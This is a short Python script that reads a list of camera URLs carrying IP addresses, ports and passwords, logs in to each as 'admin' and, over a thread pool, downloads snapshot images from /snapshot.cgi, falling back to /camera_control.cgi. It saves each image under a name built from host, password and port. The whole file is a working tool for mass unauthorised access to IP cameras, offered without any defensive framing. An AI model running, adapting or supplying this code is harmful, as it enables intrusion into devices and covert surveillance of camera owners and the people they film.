# -*- coding: utf-8 -*-
import sys
from multiprocessing.dummy import Pool as ThreadPool
from threading import Lock
import urllib.request, urllib.error
import socket
import re

socket.setdefaulttimeout(30)

urls = [line.strip() for line in open(sys.argv[1], 'r')]
urls = [x for x in urls if x]
ipPattern = re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
login = "admin"

def parse(urls):
    try:
        url = str(urls[7:-1])
        ipaddr = re.findall(ipPattern,url)
        passw = str(url.split(':')[1].split('@')[:-1])[2:-2]
        if passw == []:
            passw = ''
        else:
            pass
        snappath = url.split('@')[1]
        port = url.split(':')[2]
        filename = snappath.split(':')[0]
        filename = "{}-{}-{}.jpg".format(filename,passw,port)
        print("http://{}/snapshot.cgi?user={}&pwd={}".format(snappath,login,passw))
        urllib.request.urlretrieve("http://{}/snapshot.cgi?user={}&pwd={}".format(snappath,login,passw),filename)
        
    except urllib.error.HTTPError as e:
        if e.code == 401:
            print("{} err Unauthorized".format(urls))
        else:
            print(str(urls) + " err req. code")
    except socket.error:
        try:
            urllib.request.urlopen("http://{}/camera_control.cgi?user={}&pwd={}".format(snappath,login,passw))
        except urllib.error.HTTPError as e:
            if e.code == 200:
                urllib.request.urlretrieve("http://{}/snapshot.cgi?user={}&pwd={}".format(snappath,login,passw),filename)
                print("http://{}/snapshot.cgi?user={}&pwd={} camera err".format(snappath,login,passw))
            else:
                print("http://{}/snapshot.cgi?user={}&pwd={} err socket".format(snappath,login,passw))
        except:
            print("http://{}/snapshot.cgi?user={}&pwd={} camera socket err".format(snappath,login,passw))
    except:
        print("http://{}/snapshot.cgi?user={}&pwd={} err oth".format(snappath,login,passw))

lock = Lock()
pool = ThreadPool(5)

pool.map(parse, urls)
pool.close()
pool.join()
